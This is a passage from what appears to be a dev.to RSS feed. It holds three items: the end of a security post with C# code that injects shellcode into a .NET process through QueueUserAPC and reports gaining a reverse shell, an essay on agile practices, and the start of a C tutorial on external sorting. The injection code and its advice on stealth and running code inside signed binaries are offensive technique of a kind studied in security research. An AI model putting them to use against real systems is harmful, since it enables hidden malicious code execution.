    &lt;span class="nf"&gt;WriteProcessMemory&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;processInformation&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hProcess&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;allocatedSpacePtr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Length&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;out&lt;/span&gt; &lt;span class="n"&gt;bytesWritten&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;Process&lt;/span&gt; &lt;span class="n"&gt;process&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Process&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;GetProcessById&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;processInformation&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dwProcessId&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;foreach&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ProcessThread&lt;/span&gt; &lt;span class="n"&gt;thread&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Threads&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;IntPtr&lt;/span&gt; &lt;span class="n"&gt;threadHandle&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;OpenThread&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0x0010&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;false&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;thread&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Id&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="nf"&gt;VirtualProtectEx&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;processInformation&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hProcess&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;allocatedSpacePtr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Length&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="m"&gt;0x20&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;out&lt;/span&gt; &lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="nf"&gt;QueueUserAPC&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;allocatedSpacePtr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;threadHandle&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;As expected, the moment I close the application, we gain a reverse shell.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s---L2-4lMn--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://user-images.githubusercontent.com/12537739/126814235-5418158e-9bf0-48cb-b833-85c9d42c1b3f.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s---L2-4lMn--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://user-images.githubusercontent.com/12537739/126814235-5418158e-9bf0-48cb-b833-85c9d42c1b3f.png" alt="image"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The above image shows that the Form starts, after which the injection of the APC occurs. No connection happens as expected.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s---ZigyEYh--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://user-images.githubusercontent.com/12537739/126851778-ba85273c-d13f-4cc0-adcf-e2d60666f498.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s---ZigyEYh--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://user-images.githubusercontent.com/12537739/126851778-ba85273c-d13f-4cc0-adcf-e2d60666f498.png" alt="image"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;After exiting the form, we gain a reverse shell.&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h1&gt;

&lt;p&gt;We saw that the CLR would always make the main thread alertable, which we can leverage on using the QueueUserAPC injection method. Although we could call the alertable method ourselves, allowing the CLR to call it for us makes it more stealthy. We also saw that this could be exploited for any .NET executables.&lt;/p&gt;

&lt;p&gt;As &lt;a href="https://posts.specterops.io/the-curious-case-of-queueuserapc-3f62e966d2cb"&gt;Dwight Hohnstein&lt;/a&gt; concluded in his blogpost, one can then leverage on hooking into the task schedular events and injecting into one of the scheduled programs. This would allow our code to be ran in a "signed" binary, or be ran with leveraged permissions.&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#credits"&gt;
  &lt;/a&gt;
  Credits
&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href="https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process"&gt;Ten process injection techniques: A technical survey of common and trending process injection techniques by&lt;br&gt;
Ashkan Hosseini&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href="https://posts.specterops.io/the-curious-case-of-queueuserapc-3f62e966d2cb"&gt;The Curious Case of QueueUserAPC by Dwight Hohnstein&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href="https://www.ired.team/offensive-security/code-injection-process-injection/shellcode-execution-in-a-local-process-with-queueuserapc-and-nttestalert"&gt;Shellcode Execution in a Local Process with QueueUserAPC and NtTestAlert&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href="https://github.com/TheWover/donut"&gt;Donut-PIC Code generator for .NET&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
      <category>security</category>
      <category>cybersecurity</category>
    </item>
    <item>
      <title>Your company is not agile, and here is why</title>
      <author>Dennis Groß</author>
      <pubDate>Sun, 25 Jul 2021 14:14:44 +0000</pubDate>
      <link>https://dev.to/gdenn/your-company-is-not-agile-and-here-is-why-28ib</link>
      <guid>https://dev.to/gdenn/your-company-is-not-agile-and-here-is-why-28ib</guid>
      <description>&lt;p&gt;It is 2021 and almost every IT organisation on the planet associates itself with “agile software development”.&lt;/p&gt;

&lt;p&gt;Except that most of them are not agile.&lt;/p&gt;

&lt;p&gt;How is that possible? The answer is simple. Agile software development became just another buzz word that our industry uses. &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#remember-devops"&gt;
  &lt;/a&gt;
  Remember DevOps
&lt;/h2&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--woMKEAZw--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/o3jp6hshmybil2i98jif.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--woMKEAZw--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/o3jp6hshmybil2i98jif.jpg"&gt;&lt;/a&gt;&lt;br&gt;Picture by &lt;a href="https://unsplash.com/@juanparodriguez"&gt;Juan Pablo Rodriguez&lt;/a&gt;
  &lt;/p&gt;

&lt;p&gt;In a sense, it is like it was with “DevOps”. “DevOps” brought us this idea that we do not draw a line between operators and developers. Instead, we embrace a company &lt;strong&gt;culture&lt;/strong&gt; where developers are also responsible for the deployment and support of their code.&lt;/p&gt;

&lt;p&gt;A few years later, and recruiters search for “DevOps” instead of “Software Developers”.&lt;/p&gt;

&lt;p&gt;We created this great paradigm “DevOps” which shall help us to improve the way we develop software as a community, and we reduced it to another job title. The “DevOps” is the “Software Developer” that became Jack of all trades.&lt;/p&gt;

&lt;p&gt;And we developers play along. At some point, we got tired of explaining time and time again that “DevOps” is a culture. We submitted to the growing demand of buzz words in our industry.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#who-do-we-blame-for-that"&gt;
  &lt;/a&gt;
  Who do we blame for that?
&lt;/h2&gt;

&lt;p&gt;This post shall not roast recruiters or companies for the misuse of buzz words such as “DevOps” and “agile”. I can understand that it is difficult to attract enough talent in a growing tech landscape. You fear to be left behind, thrown into the “old economy” bracket.&lt;/p&gt;

&lt;p&gt;But there is a better way than using terms like “agile” superficially.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Embrace them&lt;/strong&gt;.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#the-agile-manifesto"&gt;
  &lt;/a&gt;
  The agile manifesto
&lt;/h2&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--8KZCU8C6--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/dik9fn05crth7ysbt782.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--8KZCU8C6--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/dik9fn05crth7ysbt782.jpg"&gt;&lt;/a&gt;&lt;br&gt;Picture by &lt;a href="https://unsplash.com/@svalenas"&gt;Sergiu Vălenaș&lt;/a&gt;
  &lt;/p&gt;

&lt;p&gt;The agile software development concept largely derives from the “agile manifest”. &lt;/p&gt;

&lt;p&gt;2001 Utah, a group of 17 programming enthusiasts meet in a skiing resort to create what the world today knows as the “agile manifest”.  The participants had different ideas in mind how software development should be approached.&lt;/p&gt;

&lt;p&gt;The “Extreme Coding” representatives neglect most of the planning effort and focus on coding. &lt;/p&gt;

&lt;p&gt;The “Scrum” advocated follow a step-by-step approach and divide long processes into chunks, the sprints.&lt;/p&gt;

&lt;p&gt;…&lt;/p&gt;

&lt;p&gt;The participants did not expect to come to any conclusion. The opinions and approaches that each of them had in mind were too different.&lt;/p&gt;

&lt;p&gt;But we would not sit here if they could not agree on a couple of principles.&lt;br&gt;
Eventually, they agreed on 4 principles.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#1-individuals-and-interactions-over-processes-and-tools"&gt;
  &lt;/a&gt;
  (1) Individuals and interactions over processes and tools
&lt;/h2&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--OVS6z9Vd--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/rihwfm7c4ymjsgah3bwh.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--OVS6z9Vd--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/rihwfm7c4ymjsgah3bwh.jpg"&gt;&lt;/a&gt;&lt;br&gt;Picture by &lt;a href="https://unsplash.com/@antoinebeauvillain"&gt;Antoine Beauvillain&lt;/a&gt;
  &lt;/p&gt;

&lt;p&gt;Processes do not create complex IT systems, people do!&lt;/p&gt;

&lt;p&gt;And it is the job of executives to provide enough space for those people to be creative and productive.&lt;/p&gt;

&lt;p&gt;The first principle does not teach us anarchy. It does not mean that we should not have any processes or tools. Processes are great, they &lt;strong&gt;help us&lt;/strong&gt; to solve problems. But they also defeat the higher purpose if you force them on people.&lt;/p&gt;

&lt;p&gt;A process should never feel obligatory. There should always be a way to bend the rules if the situation demands it. And your developers should have the power to decide when to diverge from the process.&lt;/p&gt;

&lt;p&gt;But the first principle teaches us more than that.&lt;/p&gt;

&lt;p&gt;It tells us that we should not create a &lt;strong&gt;fixed&lt;/strong&gt; plan. That does not mean that we will never create a UML diagram. Neither does it mean that we jump into an idea without planning our approach first.&lt;/p&gt;

&lt;p&gt;It tells us that we should be flexible with the plans that we create. &lt;/p&gt;

&lt;p&gt;Compare this with the “waterfall” approach:&lt;/p&gt;

&lt;p&gt;(1) Requirements&lt;br&gt;
(2) Analysis&lt;br&gt;
(3) Design&lt;br&gt;
(4) Implementation&lt;br&gt;
(5) Maintenance&lt;/p&gt;

&lt;p&gt;And then rinse and repeat.&lt;/p&gt;

&lt;p&gt;What happens if we find out in (4) that our UML diagram that we created in (3) does not work? &lt;/p&gt;

&lt;p&gt;Or we find out in (4) that the requirements from (1) changed?&lt;/p&gt;

&lt;p&gt;We &lt;strong&gt;adapt&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;We throw the plan out of the window if that’s necessary. Just because it was a good idea to do it like this 5 weeks ago, does not mean it is a good idea today.&lt;br&gt;
And yes, that hurts, but how much more will it hurt if we go willingly into the wrong direction 5 more weeks?&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#2-working-software-over-comprehensive-documentation"&gt;
  &lt;/a&gt;
  (2) Working software over comprehensive documentation
&lt;/h2&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--kSC46bxV--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/i9rlx39fdb1kxxz95vy5.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--kSC46bxV--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/i9rlx39fdb1kxxz95vy5.jpg"&gt;&lt;/a&gt;&lt;br&gt;Picture by &lt;a href="https://unsplash.com/@beatriz_perez"&gt;Beatriz Pérez Moya&lt;/a&gt;
  &lt;/p&gt;

&lt;p&gt;Who here truly believes it is better to document an ugly code passage rather than refactoring it in the first place?&lt;/p&gt;

&lt;p&gt;I guess none of you raised the hand.&lt;/p&gt;

&lt;p&gt;But why do we still do this in practice? &lt;/p&gt;

&lt;p&gt;A software product is not a thing that is set in stone. Software is more like a living organism. It requires attention and produces waste. We call this waste “technical debt”. And it is the job of every software developer, regardless of experience, to clean that waste up!&lt;/p&gt;

&lt;p&gt;That does not mean that developers should refactor their code until they reached perfection. No, but perfection is far away from code that got hacked together in the first place and enforced by duct tape in the years following.&lt;/p&gt;

&lt;p&gt;Any software product should have a &lt;strong&gt;reasonable&lt;/strong&gt; code quality.&lt;/p&gt;

&lt;p&gt;You may ask: “when do we know that we reached reasonable code quality”.&lt;/p&gt;

&lt;p&gt;Let me answer this question with a counter question: “how does a sailor know that his ship is good enough to swim?”. Probably not when there is water coming in from all sides and your captain is drunk in the cabin.&lt;/p&gt;

&lt;p&gt;Reasonable code quality follows a few ground rules:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Our colleagues understand each other's code. Code passages that are too complicated to understand receive &lt;strong&gt;small&lt;/strong&gt; doc strings.&lt;/li&gt;
&lt;li&gt;We have tests that answer whether the software works with a simple “yes” or “no”. These tests are &lt;strong&gt;reliable&lt;/strong&gt;, they deliver the same result when we don’t change the settings.&lt;/li&gt;
&lt;li&gt;Our code is not redundant. We extract code that does the same into helper functions or helper classes.&lt;/li&gt;
&lt;li&gt;We tested our code in a realistic setting. Our testing environment simulates the production system &lt;strong&gt;reasonably&lt;/strong&gt; well.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Now where does that leave us with documentation. Is documentation evil?&lt;/p&gt;

&lt;p&gt;No, it is not.&lt;/p&gt;

&lt;p&gt;But sadly, more often than not, technical documentation of source code consists either of “captain obvious” comments or feels like a novel by Stephen King. &lt;/p&gt;

&lt;p&gt;If you think you need to write technical documentation:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Think again. Do you really need more documentation? Can I expect other developers to understand my code without doc strings?&lt;/li&gt;
&lt;li&gt;Avoid passive speech and write short, &lt;strong&gt;simple&lt;/strong&gt;, sentences. “Called by the great object Foo, the method Bar computes the square sum of a and b” vs. “Called by Foo, computes the square sum of a and b”&lt;/li&gt;
&lt;li&gt;Good documentation answers how it works. Great documentation answers also why. Document important architectural decisions.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#3-customer-collaboration-over-contract-negotiation"&gt;
  &lt;/a&gt;
  (3) Customer collaboration over contract negotiation
&lt;/h2&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--PPZqgW8W--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/b9rm5c8wrvbpu1jnvhsf.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--PPZqgW8W--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/b9rm5c8wrvbpu1jnvhsf.jpg"&gt;&lt;/a&gt;&lt;br&gt;Picture by &lt;a href="https://unsplash.com/@dylandgillis"&gt;Dylan Gillis&lt;/a&gt;
  &lt;/p&gt;

&lt;p&gt;“I am sorry, we cannot change that, we wrote in contract position 15.3.2 that the feature should …”&lt;/p&gt;

&lt;p&gt;Who cares? The customer hired you to solve a problem, their problem. You should not nail them down on the contract that they signed months ago when they did not even know 10% of the challenges that lay ahead.&lt;/p&gt;

&lt;p&gt;Behaviour like that does not solve problems, it creates problems.&lt;/p&gt;

&lt;p&gt;“Ok, but shall we pay the additional cost of adjustment requests of the customer?”&lt;/p&gt;

&lt;p&gt;No, you don’t have to pay the extra cost. &lt;/p&gt;

&lt;p&gt;Listen to customer feedback and let it sink in. Tell them that you discuss the topic with the team if you don’t have a solution now. Come back in the next meeting and provide a solution. Show that you go a few steps of the way before you want more money.&lt;/p&gt;

&lt;p&gt;Don’t be that person who comes with empty hands and demands something.&lt;/p&gt;

&lt;p&gt;You can discuss the additional cost with the customer once you came up with a solution. The third principle teaches us to put the &lt;strong&gt;customer first&lt;/strong&gt; and the &lt;strong&gt;contract second&lt;/strong&gt;.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#4-responding-to-change-over-following-a-plan"&gt;
  &lt;/a&gt;
  (4) Responding to change over following a plan
&lt;/h2&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--ldOSBgCS--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/u13b2fas1zqtjbntl8j1.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--ldOSBgCS--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/u13b2fas1zqtjbntl8j1.jpg"&gt;&lt;/a&gt;&lt;br&gt;Picture by &lt;a href="https://unsplash.com/@greatmalinco"&gt;Daniel Tausis&lt;/a&gt;
  &lt;/p&gt;

&lt;p&gt;Have you every asked yourself how project management approaches such as “Scrum” transformed an entire industry?&lt;/p&gt;

&lt;p&gt;“Scrum” was one of the first that implemented a quick feedback system that embraces changes in projects.&lt;/p&gt;

&lt;p&gt;The entire concept of sprints and customer demos leads to early feedback. And you can react to this feedback within the next sprint.&lt;/p&gt;

&lt;p&gt;Of course, that works only if you don’t plan five sprints ahead.&lt;/p&gt;

&lt;p&gt;This taps again into the first principle “(1) Individuals and interactions over processes and tools”. We do not follow a fixed plan, and we do not plan five steps ahead. Staying agile means to go one step after another. &lt;/p&gt;

&lt;p&gt;This point is also the biggest shortcoming of classical approaches such as “waterfall”. The customer feedback comes at the end of a full “waterfall” cycle. But the problem is that we are already committed 6–12 months of work into the project. Mistakes that we made during the requirements phase become more expensive with every week that passes by.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#we-do-scrum-we-are-agile"&gt;
  &lt;/a&gt;
  We do “Scrum”, we are agile!
&lt;/h2&gt;

&lt;p&gt;Let me tell you this: you can implement any project management — tool or approach in your company. It does not matter. Your organisation is not agile unless you embody the agile manifest principles.&lt;/p&gt;

&lt;p&gt;You don’t believe me?&lt;/p&gt;

&lt;p&gt;Then ask yourself how agile it is to follow “Scrum” by the handbook word by word. It is not. It violates our first agile principle, “(1) Individuals and interactions over processes and tools”.&lt;/p&gt;

&lt;p&gt;There is no place for dogmatism in agile software development.&lt;/p&gt;

&lt;p&gt;Regard project management paradigms like “Scrum” and “Kanban” like a framework. Developers use frameworks to make their life easier. They are great. They provide us with structure, stability and save us a lot of work.&lt;/p&gt;

&lt;p&gt;But how often does a developer use 100% of a frameworks' functionality?&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Never&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;It would not be efficient. We just use the bits of a framework that we need. Executives should do the same. Focus on the “Scrum” bits that provide your company business value, ignore the rest.&lt;/p&gt;

&lt;p&gt;So please, the next time you send your Scrum master to the certification, sit down with them afterwards and discuss what processes make really sense for the organisation.&lt;/p&gt;

&lt;p&gt;You don’t need to do a “Team Velocity analysis” after each sprint if you only have two developers.&lt;/p&gt;

&lt;p&gt;Following the ”Scrum” handbook from A to Z will not improve productivity. It will slow your organisation down. Even worse, it will annoy the developers. And when developers don’t like their working place, they leave.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#keep-developers-out-of-the-loop"&gt;
  &lt;/a&gt;
  Keep developers out of the loop
&lt;/h2&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--lssHgLo_--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/e8di43q453i5agcldlea.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--lssHgLo_--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/e8di43q453i5agcldlea.jpg"&gt;&lt;/a&gt;&lt;br&gt;Picture by &lt;a href="https://unsplash.com/@bchild311"&gt;Benjamin Child&lt;/a&gt;
  &lt;/p&gt;

&lt;p&gt;So try to put yourself into the shoes of a developer. Almost every organisation that I know has not enough developers. Consequentially, developers have to work in multiple different projects and perform in different roles.&lt;/p&gt;

&lt;p&gt;And that is ok. We accept that challenge. We accept any challenge that you present to us. But we cannot duplicate ourselves. We will prioritise and some things remain unfinished.&lt;/p&gt;

&lt;p&gt;But please, do not add a dozen project management meetings on top. The “time to market” or “return of investment” does not matter to us. Developers are there to &lt;strong&gt;develop&lt;/strong&gt; code or technical systems.&lt;/p&gt;

&lt;p&gt;It is nice to gather the staff once in a while and give them a presentation, explaining to them how the organisation is doing. Transparency goes a long way in building trust between the management and the team. But please keep the frequency and length of these meetings at bay.&lt;/p&gt;

&lt;p&gt;Avoid open-ended meetings. Most meetings can be done in 30 minutes and in some cases extend to 60 or 90 minutes. Consider a follow-up meeting if you can’t discuss something in 30 minutes.&lt;/p&gt;

&lt;p&gt;Keep non-technical meetings short and move them after lunchtime. The morning is the most efficient time of the day.&lt;/p&gt;

&lt;p&gt;But how do you find out if you should invite your developers to a meeting?&lt;/p&gt;

&lt;p&gt;Just think about the reason you need them in the meeting. If there is no good reason why they should attend, then they &lt;strong&gt;don’t attend&lt;/strong&gt;. And “keeping people in the loop” is not a reason. That is cheating. ;-)&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#summary"&gt;
  &lt;/a&gt;
  Summary
&lt;/h2&gt;

&lt;p&gt;People are different. Everyone has a unique perspective on life, on work. The same is true for developers and executives.&lt;/p&gt;

&lt;p&gt;We studied in different fields, and we work on different things.&lt;/p&gt;

&lt;p&gt;And that’s great. That makes us succeed.&lt;/p&gt;

&lt;p&gt;Unfortunately, it makes us misunderstand each other, too. &lt;/p&gt;

&lt;p&gt;That is the reason I wrote this post. It is not about pointing the finger at people and demonstrating an organisational shortcoming. It is about demonstrating another perspective, the perspective of a technician.&lt;/p&gt;

&lt;p&gt;So let us discuss this topic.&lt;/p&gt;

&lt;p&gt;Tell us what you think about “agile”, what you understand about it. Do you agree with the ideas that I presented to you in this post? Do you disagree? &lt;/p&gt;

&lt;p&gt;Then write a comment! &lt;/p&gt;

</description>
      <category>discuss</category>
      <category>agile</category>
      <category>productivity</category>
      <category>leadership</category>
    </item>
    <item>
      <title>Sorting 1 billion numbers</title>
      <author>Nathaniel</author>
      <pubDate>Sun, 25 Jul 2021 14:11:35 +0000</pubDate>
      <link>https://dev.to/llldar/sorting-1-billion-numbers-3h</link>
      <guid>https://dev.to/llldar/sorting-1-billion-numbers-3h</guid>
      <description>&lt;p&gt;Today we are going to try to sort 1 billion numbers. To be exact, they are 1 billion 32bit signed integers. Which have a size of around 4GB. Loading all of them into memory at once is possible, but not really the point here. I'm trying to practice external sorting, a way of sorting data that are too large to fit inside memory.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#beginning"&gt;
  &lt;/a&gt;
  Beginning
&lt;/h3&gt;

&lt;p&gt;The easiest way of external sorting is merge sort. We can use the large-capacity external storage to divide the 1 billion numbers into small pieces, loading and sorting them one by one, then write each piece into the external memory after sorting.&lt;/p&gt;

&lt;p&gt;After the segmentation is completed, these small pieces are merged and sorted. At the same time, in the process of merging and sorting, the maximum value obtained will be written into the file in real time, so that low memory usage can be guaranteed.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#divide"&gt;
  &lt;/a&gt;
  Divide
&lt;/h3&gt;

&lt;p&gt;Suppose we have a file named &lt;code&gt;billion&lt;/code&gt;, which contains 1 billion 32 bit signed int binary data. We need to cut it up into a number of pieces. Here I divide it into 100 parts, with each part containing 10 million numbers. Each one of them  need to be sorted. Here we use qsort to sort part of the file.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight c"&gt;&lt;code&gt;&lt;span class="k"&gt;static&lt;/span&gt; &lt;span class="kr"&gt;__int32&lt;/span&gt; &lt;span class="n"&gt;piece&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;PIECESIZE&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;comp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="k"&gt;const&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;const&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kr"&gt;__int32&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kr"&gt;__int32&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

